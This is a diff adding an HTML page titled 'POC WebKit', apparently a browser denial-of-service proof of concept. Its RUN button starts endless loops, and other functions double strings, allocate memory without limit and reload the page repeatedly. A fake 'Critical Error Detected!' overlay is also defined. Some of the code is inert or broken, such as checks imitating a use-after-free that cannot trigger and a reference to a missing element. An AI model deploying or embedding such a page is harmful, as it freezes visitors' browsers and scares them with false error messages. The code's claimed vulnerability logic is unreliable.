@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title> POC WebKit  </title>
+<style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #000000;
+            margin: 0;
+        }
+
+        button {
+            font-size: 20px;
+            padding: 15px 30px;
+            margin: 20px;
+            border-radius: 8px;
+            border: none;
+            background-color: #24282b;
+            color: white;
+            cursor: pointer;
+        }
+
+        #progress-container {
+            width: 80%;
+            background-color: #ccc;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        #progress-bar {
+            width: 0%;
+            height: 30px;
+            background-color: #24282b;
+            border-radius: 5px;
+            text-align: center;
+            line-height: 30px;
+            color: white;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+    </style>
+<script>
+function infiniteLoop() {
+  while (true) {
+    let resource = { value: "loaded" };
+    let backup = resource;
+    console.log("Resource status:", backup.value);
+    resource = null;
+    try {
+      console.log("Backup still holds:", backup.value);
+    } catch (error) {
+      console.log("Issue detected:", error.message);
+    }
+  }
+}
+
+function heavyLoad() {
+  let bigData = "Z".repeat(1000000);
+  let memoryCache = [];
+  let emptyContainers = [];
+  let massiveObject = {};
+  let index = 0;
+  let refreshThreshold = 0;
+
+  while (true) {
+    bigData += bigData;
+    if (bigData.length > 100000000) bigData = "Z".repeat(1000000);
+    
+    memoryCache.push(new ArrayBuffer(1000000));
+    if (memoryCache.length > 1000) memoryCache = [];
+    
+    emptyContainers.push([]);
+    if (emptyContainers.length > 1000) emptyContainers = [];
+    
+    refreshThreshold++;
+    if (refreshThreshold >= 100) window.location.reload();
+
+    massiveObject[index] = "Z".repeat(1000);
+    index++;
+    
+    if (index > 10000000) {
+      massiveObject = {};
+      index = 0;
+    }
+  }
+}
+
+function alertMessage() {
+  let notification = document.createElement('div');
+  notification.innerHTML = '<h2>Critical Error Detected!</h2>';
+  notification.style.position = 'absolute';
+  notification.style.top = '40%';
+  notification.style.left = '50%';
+  notification.style.transform = 'translate(-50%, -50%)';
+  notification.style.backgroundColor = 'darkred';
+  notification.style.color = 'white';
+  notification.style.padding = '30px';
+  notification.style.borderRadius = '10px';
+  document.body.appendChild(notification);
+}
+
+let instanceList = [];
+
+class SystemObject {
+  constructor() {}
+}
+
+const systemMonitor = () => {
+  let iterationCount = 0;
+  infiniteLoop();
+  
+  while (true) {
+    let dataPacket = { info: "active" };
+    let clonedPacket = dataPacket;
+    console.log("Packet status:", clonedPacket.info);
+    dataPacket = null;
+    
+    try {
+      console.log("Cloned packet holds:", clonedPacket.info);
+    } catch (issue) {
+      console.log("Packet lost:", issue.message);
+    }
+    
+    iterationCount++;
+    if (iterationCount >= 500) window.location.reload();
+    
+    for (let i = 0; i < 1000; i++) {
+      instanceList.push(new SystemObject());
+    }
+    
+    document.getElementById('statusIndicator').innerHTML = `Total objects created: ${instanceList.length}`;
+  }
+}
+
+function recursiveString() {
+  let repeatedStr = "X".repeat(1000000);
+  
+  while (true) {
+    repeatedStr += repeatedStr;
+    if (repeatedStr.length > 1000000000) repeatedStr = "X".repeat(1000000);
+  }
+}
+
+
+</script>
+</head>
+<body>
+  
+    <button onClick="systemMonitor()">RUN</button>
+    <div id="msg"></div>
+</body>
+</html>
